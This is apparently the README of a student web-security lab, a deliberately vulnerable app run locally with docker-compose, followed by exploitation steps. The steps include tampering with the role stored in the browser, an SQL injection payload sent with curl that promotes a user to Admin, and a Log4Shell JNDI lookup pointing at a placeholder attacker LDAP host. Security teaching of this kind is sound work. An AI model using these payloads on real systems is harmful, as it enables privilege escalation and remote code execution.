# TP Seguridad en Applicaciones Web

## [Demo video](https://drive.google.com/file/d/1Jy41PdcE7lbrG2uBrEBUVRorgJiRW0ne)


## Running the application

Build it yourself (you don't need any Java-related tooling):

```bash
docker-compose up
```

## Exploitation steps

1. Modify de local storage role, from User to Enterprise

2. Make admin with SQLi

```bash
curl --location --request POST 'http://localhost:8080/movie' \
--header 'Content-Type: application/json' \
--data-raw '{
"name": "ppppppp'\''); update users set role='\''Admin'\'' where email = '\''admin3@gmail.com'\'';--"
}'
```

3. Setup de exploit env and send this request

```bash
curl --location --request PUT 'http://localhost:8080/user?email=admin3@gmail.com' \
--header 'Content-Type: application/json' \
--data-raw '{
        "role": "${jndi:ldap://IP:1389/a}"
}'
```
